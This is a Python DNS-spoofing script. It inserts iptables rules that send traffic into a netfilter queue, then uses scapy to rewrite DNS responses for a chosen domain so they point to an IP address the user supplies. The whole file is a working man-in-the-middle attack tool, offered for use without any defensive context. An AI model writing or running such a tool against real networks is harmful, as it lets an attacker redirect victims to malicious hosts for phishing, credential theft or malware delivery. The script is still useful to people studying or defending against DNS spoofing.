#!/usr/bin/env python
############################# [ IMPORTS ] #############################

import netfilterqueue, subprocess, ipaddress
from scapy.all import *

############################# [ FUNCTIONS ] #############################
# Handling the args
def getArgs():
    parser = argparse.ArgumentParser()  # Create an object to get args
    # Options of this program
    parser.add_argument("-U", "-u", "--url", dest="url", help="URL address to spoof", type=str)
    parser.add_argument("-S","-s", "--spoof", dest="spoof", help="IP address to replace the orignal one", type=str)
    options = parser.parse_args()
    # print(parser.parse_args())
    if not options.url:  # Check if url is empty
        parser.error("\n[-] Please specify a url, use --help for more info.")
    else:
        try:  # Check if URL exists
            response = requests.head(options.url) 
        except requests.exceptions.RequestException:
            parser.error("\n[-] Please specify a valid url, use --help for more info.")

    if not options.spoof:  # Check if spoof address is empty
        parser.error("\n[-] Please specify a spoof IP to use, use --help for more info.")
    else:
        try:
            ipaddress.IPv4Address(options.spoof)
        except (ipaddress.AddressValueError, ipaddress.NetmaskValueError):
            parser.error("\n[-] Please specify a valid IP(v4) for spoofing, use --help for more info.")

    return options

# --------------------------------------------------
# Funtion to handle packet in the NFQUEUE
def handlePacket(packet):
    pkt = IP(packet.get_payload())  # Get IP layer from payload
    if pkt.haslayer(DNSRR):  # Intercept packet only if it contains DNS Response
        qname = pkt[DNSQR].qname
        if options.url in str(qname):
            print("[+] Spoofing url")
            answer = DNSRR(rrname=qname, rdata=options.spoof)
            pkt[DNS].ancount = 1
            pkt[DNS].an = answer

            # Make sure these fields do not corrupt packets (with 'del' it will recalculate them automatically)
            del pkt[IP].len
            del pkt[IP].chksum
            del pkt[UDP].len
            del pkt[UDP].chksum

            packet.set_payload(bytes(pkt))
    packet.accept()


############################# [ LAUNCH ] #############################
options = getArgs()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, handlePacket)

try:
    subprocess.run("sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0", shell=True)
    subprocess.run("sudo iptables -I INPUT -j NFQUEUE --queue-num 0", shell=True)
    subprocess.run("sudo iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True)
    while True:
        queue.run()
except KeyboardInterrupt:
    print("\n[-] Exiting program ... ")
    subprocess.run("sudo iptables -D OUTPUT -j NFQUEUE --queue-num 0", shell=True)
    subprocess.run("sudo iptables -D INPUT -j NFQUEUE --queue-num 0", shell=True)
    subprocess.run("sudo iptables -D FORWARD -j NFQUEUE --queue-num 0", shell=True)
except Exception as e:
    print(f"\n[-] {e}")
    exit(1)
    #time.sleep(0.052)
    #time.sleep(0.045)

